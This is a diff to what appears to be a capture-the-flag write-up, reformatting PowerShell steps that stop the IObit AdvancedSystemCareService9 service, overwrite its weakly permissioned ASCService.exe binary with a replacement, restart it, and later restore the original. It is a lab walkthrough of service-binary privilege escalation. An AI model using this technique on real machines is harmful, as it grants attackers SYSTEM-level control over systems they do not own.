@@ -229,8 +229,10 @@ Replace the ASCService.exe binary (its permissions are such that we can do this)
 
 ```powershell
 Stop-Service -Name AdvancedSystemCareService9
-cp "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe" ASCService.exe.bak
-cp -force ASCService.exe "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+cp "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+   ASCService.exe.bak
+cp -force ASCService.exe
+   "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 Start-Service -Name AdvancedSystemCareService9
 ```
 
@@ -246,7 +248,8 @@ Once we have the root flag, let's put the service back the way it was before we 
 
 ```powershell
 Stop-Service -Name AdvancedSystemCareService9
-cp -force ASCService.exe.bak "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
+cp -force ASCService.exe.bak
+   "C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
 Start-Service -Name AdvancedSystemCareService9
 ```
 
